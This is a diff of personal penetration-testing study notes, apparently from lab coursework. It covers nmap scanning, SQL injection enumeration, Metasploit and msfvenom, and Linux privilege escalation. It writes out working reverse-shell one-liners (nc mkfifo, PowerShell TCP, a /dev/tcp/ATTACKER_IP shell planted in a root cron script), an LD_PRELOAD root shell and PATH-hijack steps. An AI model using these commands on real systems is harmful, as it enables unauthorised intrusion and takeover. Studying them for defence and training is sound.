@@ -403,17 +403,17 @@ Without this, XSS and SQLi won’t fully click.
   
     	- TCP Header Flags:
   
-       		-> URG : urgent flag first priority to be processed
+       		- URG : urgent flag first priority to be processed
   
-       		-> ACK: acknowledge the receipt of a TCP segment
+       		- ACK: acknowledge the receipt of a TCP segment
   
-       		-> PSH: push flag asking TCP to pass the data to the applicatioh
+       		- PSH: push flag asking TCP to pass the data to the applicatioh
   
-     		-> RST: Reset flag used to reset the connection
+     		- RST: Reset flag used to reset the connection
   
-       		-> SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
+       		- SYN: Synchronize flag used to initiate a TCP 3-way handshake and synchronize sequence numbers
   
-       		-> FIN: Finish flag meaning the sender has no more data to send
+       		- FIN: Finish flag meaning the sender has no more data to send
         
 - TCP Connect Scan:
   
@@ -425,12 +425,12 @@ Without this, XSS and SQLi won’t fully click.
 
 - Other TCP scans:
   
-  - -sN (null), -sF (fin), -sX (Xmas)
+	- -sN (null), -sF (fin), -sX (Xmas)
         		->Similarites: if port open RST packet is received otherwise reported as open|filtered
   
-  - -sM (Maimon scan)
+  	- -sM (Maimon scan)
   
-  - -sA (ACK scan)
+  	- -sA (ACK scan)
 
 - UDP Scan:
   
@@ -454,19 +454,25 @@ Without this, XSS and SQLi won’t fully click.
   
 		$ sudo nmap -sS -p80 -f MACHINE_IP
   
-  -> The 24 bytes of TCP header will be divided into multiple bytes of 8.
+ 	 - The 24 bytes of TCP header will be divided into multiple bytes of 8.
   
-  -> So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
+  	 - So, adding another -ff will fragment the data into multiples of 16, first will get 16 bytes and thhe remaing will get the 8 bytes of the TCP header.
     
 - Service Detection:
   
-		$ sudo nmap -sV MACHINE_IP (grabs service banner and bersion info)
+		$ sudo nmap -sV MACHINE_IP
+  
+  - grabs service banner and bersion info
 
 - OS Detection and Traceroute:
   
-		$ sudo nmap -sS -O MACHINE_IP (OS details)
+		$ sudo nmap -sS -O MACHINE_IP
   
-		$ sudo nmap -sS --traceroute MACHINE_IP (finding routers between attacker and the target)
+  - OS details
+  
+		$ sudo nmap -sS --traceroute MACHINE_IP
+
+ - finding routers between attacker and the target
 
 # NETWORKS ATTACKS
 
@@ -478,9 +484,9 @@ Without this, XSS and SQLi won’t fully click.
   
 		$ sudo tcpdump port 110 -A (requires access to the network traffic)
   
-    	-> here POP3 packets are being captured. -A means we want it in ASCII format
+  - here POP3 packets are being captured. -A means we want it in ASCII format
   
-  		-> Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
+  - Solution: Adding an encryption layer on top of any network protocol. Particularly, Transport Layer Security (TLS).
     
 ## Man-in-the-middle (MITM) attack:
 
@@ -610,29 +616,48 @@ Without this, XSS and SQLi won’t fully click.
   
 		$ select * from users where username = '%username%' LIMIT 1;
   
-		$ username UNION SELECT 1;-- (saerching number of columns in the user's table)
+		$ username UNION SELECT 1;--
+
+  (saerching number of columns in the user's table)
   
-		$ username UNION SELECT 1,2,3;-- (finding the path to the actual column)
+		$ username UNION SELECT 1,2,3;--
+
+  (finding the path to the actual column)
   
-		$ username UNION SELECT 1,2,3 where database() like '%';-- (enumeration of the database)
-			-> cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. After finding the first letter do it until we find the database full 			name.
+		$ username UNION SELECT 1,2,3 where database() like '%';--
+
+  (enumeration of the database)
+			- cycle all the keys on the keyboars in the "like" operator such as 'a%' then another time 'b%' until the string matches the first letter of the database name. After finding the first letter do it until we find the database full name.
   
-		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--  (enumeration of table name)
-			-> using infromation_schema database to find the table name just like we found the databse name using "like" operator.
+		$ username UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'something' and table_name like 'a%';--
+    (enumeration of table name)
+			- using infromation_schema database to find the table name just like we found the databse name using "like" operator.
   
-		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%'; (enumerating column name)
+		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%';
+
+   (enumerating column name)
   
-		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id'; (preventing the discovery of the same column twice)
+		$ admin123' UNION SELECT 1,2,3 FROM information_schema.COLUMNS WHERE TABLE_SCHEMA='something' and TABLE_NAME='something' and COLUMN_NAME like 'a%' and COLUMN_NAME !='id';
+
+   (preventing the discovery of the same column twice)
   
-		$ username UNION SELECT 1,2,3 from users where username like 'a% (enumeration of username)
+		$ username UNION SELECT 1,2,3 from users where username like 'a%
+
+  (enumeration of username)
   
-		$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a% (enumerating password)
+		$ username UNION SELECT 1,2,3 from users where username='something' and password like 'a%
+
+  (enumerating password)
 
 - Time Based Blind SQLi:
   
-		$ username UNION SELECT SLEEP(5);-- (if there is pause to the response, it worked otherwise it failed)
+		$ username UNION SELECT SLEEP(5);--
+
+  (if there is pause to the response, it worked otherwise it failed)
   
-		$ username UNION SELECT SLEEP(5),2;-- (adding another column until the response time is 5 seconds)
+		$ username UNION SELECT SLEEP(5),2;--
+
+  (adding another column until the response time is 5 seconds)
 
 # INITIAL ACCESS AND EXPLOITATION
 
@@ -644,15 +669,15 @@ Without this, XSS and SQLi won’t fully click.
   
 - Solution:
 
-    -> make user to have a strong password
+    - make user to have a strong password
   
-    -> account lockout after certain number of failed attempts
+    - account lockout after certain number of failed attempts
   
-    -> use of CAPTCHA
+    - use of CAPTCHA
   
-    -> Two-factor Auth
+    - Two-factor Auth
   
-    -> established knowledge about the user such as IP-based geolocation
+    - established knowledge about the user such as IP-based geolocation
 
 
 ## Reverse and Bind Shell:
@@ -671,7 +696,7 @@ Without this, XSS and SQLi won’t fully click.
   
 		$ socat TCP:<LOCAL-IP>:<LOCAL-PORT> EXEC:powershell.exe,pipes
   
-	-> The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
+	- The "pipes" option is used to force powershell (or cmd.exe) to use Unix style standard input and output.
   
 - for linux to connect back:
   
@@ -716,7 +741,7 @@ Without this, XSS and SQLi won’t fully click.
 - Reverse Shell:
   
 		$ mkfifo /tmp/f; nc <LOCAL-IP> <PORT> < /tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f (target)
-  		-> creating a named pipe at /tmp/f which gets piped into the /sh.
+  - creating a named pipe at /tmp/f which gets piped into the /sh.
 
 - Bind Shell:
   
@@ -726,7 +751,7 @@ Without this, XSS and SQLi won’t fully click.
 
 		$ powershell -c "$client = New-Object System.Net.Sockets.TCPClient('<ip>',<port>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"  (target)
 		
--> Useful one-liner PSH Reverse Shell to get powershell on windows
+ (Useful one-liner PSH Reverse Shell to get powershell on windows)
 
 ## Webshells:
 
@@ -742,81 +767,83 @@ Without this, XSS and SQLi won’t fully click.
 
 - Scoring Vulnerabilites:
 
- 		 -> CVSS (Common Vulnerability Scoring System)
+ 	- CVSS (Common Vulnerability Scoring System)
 
- 		 -> VPR (Vulnerability Priority Rating)
+ 	- VPR (Vulnerability Priority Rating)
 
 - Vulnerability Databases:
 
-  		-> NVD (National Vulnerability) - CVE - YEAR - IDNUMBER
+  - NVD (National Vulnerability) - CVE - YEAR - IDNUMBER
 
-  		-> Exploit-DB - POC for exploitation to exploit specific vulnerability
+  - Exploit-DB - POC for exploitation to exploit specific vulnerability
 
 - Automated vs Manual Vulnerability Research:
 
- 		 -> Nessus (primarily used for automated vulnerability research)
+ 	- Nessus (primarily used for automated vulnerability research)
 
-  		 -> Metasploit ( auxiliary module for scanning known signatures of a vulnerability)
+  	- Metasploit ( auxiliary module for scanning known signatures of a vulnerability)
 
 - Common Vulnerabilites:
 
-  		-> Security Misconfigurations
+  - Security Misconfigurations
 
-  		-> Broken Access Control
+  - Broken Access Control
 
- 		-> Insecure Deserialization
+  - Insecure Deserialization
 
- 		-> Injection
+  - Injection
 
 ## Metasploit:
 
 - Main Components:
 
-		-> msfconsole
+	- msfconsole
 
-		-> Modules
+	- Modules
 
-  		-> Tools
+  	- Tools
 
-  		-> Vulnerability, Exploit, Payload
+  	- Vulnerability, Exploit, Payload
 
 - Modules:
 
-  		-> Auxiliary - Scanners, crawlers and fuzzers.
+  - Auxiliary : Scanners, crawlers and fuzzers.
 
-  		-> Encoders - encode the exploit and payload to bypass signature-based antivirus solution.
+  - Encoders : encode the exploit and payload to bypass signature-based antivirus solution.
 
-  		-> Evasion - will try to evade the antivirus with more or less success.
+  - Evasion : will try to evade the antivirus with more or less success.
 
-  		-> Exploits - a piece of code which uses a vulnerability present on the target system.
+  - Exploits : a piece of code which uses a vulnerability present on the target system.
 
-  		-> NOPs - No OPeration do nothing. Used as buffer to achieve consistent payload size.
+  - NOPs : No OPeration do nothing. Used as buffer to achieve consistent payload size.
 
-		-> Payloads - code that runs on the target system. Needed to achieve results on the target such as getting a shell, loading malware or backdoor.
+  - Payloads : code that runs on the target system. Needed to achieve results on the target such as getting a shell, loading malware or backdoor.
 
-  		-> Post - final stage of penetration testing, post-exploitation.
+  - Post : final stage of penetration testing, post-exploitation.
 
 - Types of Payloads:
 
-  		-> Adapters: Wraps single payloads to convert them into different formats.
+  - Adapters: Wraps single payloads to convert them into different formats.
 
-  		-> Singles: Self-contained payloads
+  - Singles: Self-contained payloads
 
-  		-> Stagers: Sets up a connection channel between Metasploit and the target system.
+  - Stagers: Sets up a connection channel between Metasploit and the target system.
 
-  		-> Stages: Downloaded by the stager after setting the stage by uploading a stager to the target system. The final payload sent will be relatively large than the first one.
+  - Stages: Downloaded by the stager after setting the stage by uploading a stager to the target system. The final payload sent will be relatively large than the first one.
 
 - Single vs Staged Payloads:
 
-  		-> generic/shell_reverse_tcp (inline/single)
+  - generic/shell_reverse_tcp (inline/single)
 
-  		-> windows/x64/shell/reverse_tcp (staged)
+  - windows/x64/shell/reverse_tcp (staged)
 
 - msfconsole:
 
   		> search type:exploit windows ms17-010
 
-   		> use * (any exploit you want to use based on the known vulnerability)
+   		> use *
+
+  (any exploit you want to use based on the known vulnerability)
 
 		> info
 
@@ -826,15 +853,23 @@ Without this, XSS and SQLi won’t fully click.
 
   		> show payloads
 
-  		> setg / unsetg (set or unset the global variable)
+  		> setg / unsetg
+
+  (set or unset the global variable)
 
   		> exploit/run
 
-   		> exploit -z (runs the exploit and background the session)
+   		> exploit -z
 
-		> sessions (checks active sessions)
+  (runs the exploit and background the session)
 
- 		> session -i ID (interact with the desired session)
+		> sessions
+
+   (checks active sessions)
+
+ 		> session -i ID
+
+  (interact with the desired session)
 
 ## Meterpreter:
 
@@ -846,7 +881,9 @@ Without this, XSS and SQLi won’t fully click.
  
 - Commands (meterpreter):
 
-  		> msfvenom --list payloads | grep meterpreter (depends which one to use by analyzing target operating system, components and the network connection type)
+  		> msfvenom --list payloads | grep meterpreter
+
+  (depends which one to use by analyzing target operating system, components and the network connection type)
 
   		> getpid
 
@@ -867,13 +904,19 @@ Without this, XSS and SQLi won’t fully click.
 		$ msfvenom -p <PAYLOAD> <OPTIONS>
 	
 		$ msfvenom -p windows/x64/shell/reverse_tcp -f exe -o shell.exe LHOST=<listen-IP> LPORT=<listen-port>
-	        {<OS>/<arch>/<payload>}
+	       				 {<OS>/<arch>/<payload>}
 			
-		$ shell_reverse_tcp (stageless payload)
+		$ shell_reverse_tcp
+
+   (stageless payload)
 	
-		$ shell/reverse_tcp (staged payload)
+		$ shell/reverse_tcp
+
+   (staged payload)
 	
-		$ metasploit multi/handler (used for staged payload)
+		$ metasploit multi/handler
+
+  (used for staged payload)
 
 ## Multi Handler:
 
@@ -881,9 +924,11 @@ Without this, XSS and SQLi won’t fully click.
 
   		> use exploit/multi/handler
 
-   		> show options (change what needs to be changed)
+   		> show options
 
-		> set LHOST ATTACKIN_MACHINE_IP LPORT WHAT WE USED WHEN CREATING THE MSFVENOM PAYLOAD
+   (change what needs to be changed)
+
+		> set LHOST ATTACKIN_MACHINE_IP LPORT USED WHEN IN MSFVENOM PAYLOAD
 
   		> set payload USED IN MSFVENOM PAYLOAD
 
@@ -909,7 +954,7 @@ Without this, XSS and SQLi won’t fully click.
  
   	- this staged payload requires different tabs to be open, one for connecting to the target machine using ssh or any known methods, two for msfvenom to generate payload and host a python server and third one to listen to the upcoming payload that msfvenom created that was ran on the target machine.
 
-* This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and execution of the file is also different.
+* This is for LINUX target machine. For windows also it is the same but the command to download the payload from the attacker server is different and downloadable executive of the file is also different.
 
 # LINUX PRIVILEGE ESCALATION
 
@@ -939,39 +984,73 @@ Without this, XSS and SQLi won’t fully click.
  
   - Find Commands:
 
-			$ find . -name nischal.txt (find this file in the current directory)
+			$ find . -name nischal.txt
 
-			$ find /home -name nischal.txt (find file in home dir)
+(find this file in the current directory)
 
-			$ find / -type d -name config (dictory named config under"/")
+			$ find /home -name nischal.txt 
+			
+(find file in home dir)
 
-			$ find / -type f -perm 0777 (files with 777 permissions)
+			$ find / -type d -name config
+			
+(dictory named config under"/")
 
-			$ find / -perm a=x (executable files)
+			$ find / -type f -perm 0777 
+			
+(files with 777 permissions)
 
-			$ find /home -user nischal (all files for user "nischal" under "/home"
+			$ find / -perm a=x 
+			
+(executable files)
 
-			$ find / -mtime 10 (modifies in the last 10 days)
+			$ find /home -user nischal
+			
+(all files for user "nischal" under "/home"
 
-			$ find / -atime 10 (accessed in the past 10 days)
+			$ find / -mtime 10 
+			
+(modifies in the last 10 days)
 
-			$ find / -cmin -60 (changed in the last 60 mins)
+			$ find / -atime 10 
+			
+(accessed in the past 10 days)
 
-			$ find / -amin -60 (accessed withing the last 60 mins)
+			$ find / -cmin -60 
+			
+(changed in the last 60 mins)
 
-			$ fine / -size 50M (with size of 50MB)
+			$ find / -amin -60 
+			
+(accessed withing the last 60 mins)
 
-			$ find / -writable -type d 2>/dev/null (world-writable folder)
-			-> 2>/dev/null redirects error to "/dev/null" so we can get cleaner output
+			$ fine / -size 50M 
+			
+(with size of 50MB)
 
-			$ find / -perm -333 -type d 2>/dev/null (world-writable folder)
+			$ find / -writable -type d 2>/dev/null 
+			
+(world-writable folder)
 
-			$ find / -perm -o x -type d 2>/dev/null (world-executable folders)
+ (2>/dev/null redirects error to "/dev/null" so we can get cleaner output)
 
-			$ find / -name python* (supported languages)
+			$ find / -perm -333 -type d 2>/dev/null 
+			
+(world-writable folder)
 
-			$ find / -perm -u=s -type f 2>dev/null (files with the SUID bit)
-    		-> this allows us to run fule with a higher privilege than the current level we end up with while getting the linux shell)
+			$ find / -perm -o x -type d 2>/dev/null
+			
+(world-executable folders)
+
+			$ find / -name python* 
+			
+(supported languages)
+
+			$ find / -perm -u=s -type f 2>dev/null 
+			
+(files with the SUID bit)
+    		
+  - finding this executing it in a proper way allows us to run file with a higher privilege than the current level we end up with while getting the linux shell
 
 
 ## Privilege Escalation: Kernel Exploits
@@ -990,17 +1069,19 @@ Without this, XSS and SQLi won’t fully click.
 
 - Solution:
 
-  	-> Keeping checks on the kernel updates and patches to be safe from known vulnerabilites.
+  	- Keeping checks on the kernel updates and patches to be safe from known vulnerabilites.
 
-  	-> Enforcing SELinux or AppArmor policies so it blocks unauthorized code execution. (for eg: preventing the execution of malicious code in common /tmp directories).
+  	- Enforcing SELinux or AppArmor policies so it blocks unauthorized code execution. (for eg: preventing the execution of malicious code in common /tmp directories).
 
-  	-> Detecting aunauthorized use of gcc or other compilers by non-admin users.
+  	- Detecting aunauthorized use of gcc or other compilers by non-admin users.
 
 ## Privilege Escalation: Sudo
 
 - Low level users do not have higher privileges to run programs with root privileges. So, because of some situations, system administrators might provide regular users some flexibility on their privileges. By checking the root privileges of a low level user, we can further escalate into the root user.
 
-			$ sudo -l (checking the users root privileges)
+			$ sudo -l
+
+   (checking the users root privileges)
 
   - Use of GTFObins to search for exploits and commands that could provide root access depending on the type of privilege user currently has.
  
@@ -1008,11 +1089,11 @@ Without this, XSS and SQLi won’t fully click.
 
 - Steps for escalating this function:
 
-		-> Checking for LD_PRELOAD
+  	- Checking for LD_PRELOAD
 
-		-> Writing a simple C code which shhould be complied as a share object (.so extension)
+	- Writing a simple C code which shhould be complied as a share object (.so extension)
 
-		-> running the program with sudo rights and the LD_PRELOAD option to the .so file
+	- running the program with sudo rights and the LD_PRELOAD option to the .so file
 
   				#include<stdio.h>
   
@@ -1021,8 +1102,7 @@ Without this, XSS and SQLi won’t fully click.
   				#include<stdlib.h>
   
   
-
-  				void_init() {
+				void_init() {
   
   				unsetenv("LD_PRELOAD");
   
@@ -1032,6 +1112,8 @@ Without this, XSS and SQLi won’t fully click.
   
   				system("/bin/bash");
   				}
+ 
+  	 (Save and Exit)
 
 				$ gcc -fPIC -shared -o shell.so shell.c -nostartfiles
 
@@ -1044,7 +1126,7 @@ Without this, XSS and SQLi won’t fully click.
 
 - Files can have read, write and execute permissions. But, with SUID things are different, any files could be executed with the permission level of the file owner or the group owner. We could notice it with the "s" bit set showing their special permission.
 
-  		$ find / -type f -perm -04000 -ls 2?/dev/null
+  		$ find / -type f -perm -04000 -ls 2>/dev/null
 
   - SUID bit set for any low level commands such as nano, base64, e.t.c could result in the full compromise of the system beacuse we could further escalate the privilege by gaining access to the /etc/shadow file or simple exploiting the base64 read command for every files in the system.
 
@@ -1056,7 +1138,7 @@ Without this, XSS and SQLi won’t fully click.
 
   		$ getcap -r / 2>/dev/null
 
-		-> If we get a result such as: /home/nischal/vim = cap_setuid+ep, then we know that this capabilites has a SUID bit set. This privilege escalation vector is not discoverable when enumerating the file itself looking for SUID. So, once again we can check the GTFO bins to check the list of binaries that could be leveraged for privilege escaltion.
+- If we get a result such as: /home/nischal/vim = cap_setuid+ep, then we know that this capabilites has a SUID bit set. This privilege escalation vector is not discoverable when enumerating the file itself looking for SUID. So, once again we can check the GTFO bins to check the list of binaries that could be leveraged for privilege escaltion.
 
 ## Privilege Escaltion: Cron Jobs
 
@@ -1064,7 +1146,7 @@ Without this, XSS and SQLi won’t fully click.
 
   		$ cat /etc/crontab
 
-  		-> So, if we see that a file "backup.sh" runs with the root privilege at a certain time say like every 5 minutes then we can modify this script to give us a shell with the root privilege.
+  - So, if we see that a file "backup.sh" runs with the root privilege at a certain time say like every 5 minutes then we can modify this script to give us a shell with the root privilege.
 
   		$ nano backup.sh (assuming we found this script)
 
@@ -1072,15 +1154,17 @@ Without this, XSS and SQLi won’t fully click.
 
   		bash -i >& /dev/tcp/ATTACKER_IP/7777 0>&1
 
-  		-> everything in this script needs to be changed with the command above. The goal here is to obtain a reverse shell in the attacking machine. Commands like 'nc' will not work in this case or it depends on the available tools.
+	 (Save and Exit)
 
-  		* reverse shells are always prefferable beacuse we do not want to compromise the system integrity during real penetration tesing engagement.
+- everything in this script needs to be changed with the command above. The goal here is to obtain a reverse shell in the attacking machine. Commands like 'nc' will not work in this case or it depends on the available tools.
 
-  		- Then, we will run a listener on our attacking machine to receive the incoming connection.
+  * reverse shells are always prefferable beacuse we do not want to compromise the system integrity during real penetration tesing engagement.
+
+  - Then, we will run a listener on our attacking machine to receive the incoming connection.
 
   		$ nc -nlvp 7777
 
-  		- Assuming the script will run every five minutes, we should just wait until the script will run and we will get the reverse shell on our attacking machine with the root id.
+  - Assuming the script will run every five minutes, we should just wait until the script will run and we will get the reverse shell on our attacking machine with the root id.
 
 - Crontab is worth checking beacuse of its easy privilege escaltion vectors.
 
@@ -1096,19 +1180,19 @@ Without this, XSS and SQLi won’t fully click.
 
   		$ echo$PATH (see what is in the PATH)
 
-		-> If we type nischal to the command line, then Linux will look for an executable called "nischal" in the PATH.
+- If we type nischal to the command line, then Linux will look for an executable called "nischal" in the PATH.
 
-  - Leveraging this environmental variable solely depends on the existing configuration of the target system. So, it is always a good idea to ask yourself these questions before trying to run a script:
+- Leveraging this environmental variable solely depends on the existing configuration of the target system. So, it is always a good idea to ask yourself these questions before trying to run a script:
  
-    	-> Under $PATH, what folders are located?
+  - Under $PATH, what folders are located?
 
-		-> Do the current user has write privileges for any of these folders?
+	- Do the current user has write privileges for any of these folders?
 
-		-> Can you modify $PATH?
+	- Can you modify $PATH?
 
-		-> Is there a script/application you can start that will be affected by this vulnerability?
+	- Is there a script/application you can start that will be affected by this vulnerability?
 
-	- We will be using a simple script for demo purpose to take advantage of this vulnerability
+- We will be using a simple script for demo purpose to take advantage of this vulnerability
  
     		$ nano path.c
 
@@ -1125,31 +1209,33 @@ Without this, XSS and SQLi won’t fully click.
 
 			}
 
-			-> Here, the script tries to launch a system binary called "nischal", however we can use any binary here.
+	- Here, the script tries to launch a system binary called "nischal", however we can use any binary here.
 
-			-> First, we need to compile this script into an executable and set the SUID bit.
+	- First, we need to compile this script into an executable and set the SUID bit.
 
 			$ gcc path.c -o path -w
 
 			$ chmod u+s path
 
-			$ ls -l (should give the file "s" bit)
+			$ ls -l
 
-			-> Once this gets executed, "path" will look for an executable name "nischal" inside folders listed under PATH
+   (should give the file "s" bit)
 
-			-> If any writable folder falls under PATH, then we can create a binary name "nischal" under that directory and have our "path" script run in it. AS we have set the SUID bit, the binary will run with root privilege.
+    - Once this gets executed, "path" will look for an executable name "nischal" inside folders listed under PATH
+
+	- If any writable folder falls under PATH, then we can create a binary name "nischal" under that directory and have our "path" script run in it. AS we have set the SUID bit, the binary will run with root privilege.
 
 			$ find / -writable 2>/dev/null | cut -d "/" -f 2 | sort -u
 
-			-> This command will search for writable files where we could write our script to.
+	- This command will search for writable files where we could write our script to.
 
-			-> After this we can compare it with the PATH to find folders we could use.
+	- After this we can compare it with the PATH to find folders we could use.
 
-			-> We could use /tmp directory beacuse it is used for temporary executable files and is a standard, shared space for transient data. It is easier to write folder also. So, if /tmp: is not in the $PATH variable then we could add it using:
+	- We could use /tmp directory beacuse it is used for temporary executable files and is a standard, shared space for transient data. It is easier to write folder also. So, if /tmp: is not in the $PATH variable then we could add it using:
 
 				$ export PATH=/tmp:$PATH
 
-			 -> At this point, the path script will also look under /tmp folder for an executable named "nischal". So the next thing we need to do is copying /bin/bash as "nischal" under this folder.
+	- At this point, the path script will also look under /tmp folder for an executable named "nischal". So the next thing we need to do is copying /bin/bash as "nischal" under this folder.
 
 				$ cd /tmp
 
@@ -1159,7 +1245,7 @@ Without this, XSS and SQLi won’t fully click.
 
 				$ ls -l nischal
 
-				-> We could see the executable "nischal" on this folder. So, now we need to go back to the directory where we created the "path" script where we set its SUID bit.
+	- We could see the executable "nischal" on this folder. So, now we need to go back to the directory where we created the "path" script where we set its SUID bit.
 
 				$ ./path
 
@@ -1183,7 +1269,7 @@ Without this, XSS and SQLi won’t fully click.
  
     		# mkdir /tmp/nischal
 
-			$ mount -o rw TARGET_MACHINE_IP:/FOLDER_WITH NO_ROOT_SQUASH /tmp/nischal
+			$ mount -o rw TARGET_MACHINE_IP:/FOLDER_WITH/NO_ROOT_SQUASH /tmp/nischal
 
   - As we can set SUID bits, we will use a simple executable that will run /bin/bash on the victim system. For this we need to be on the directory where we have mounted the vulnerable folder of the target machine
 
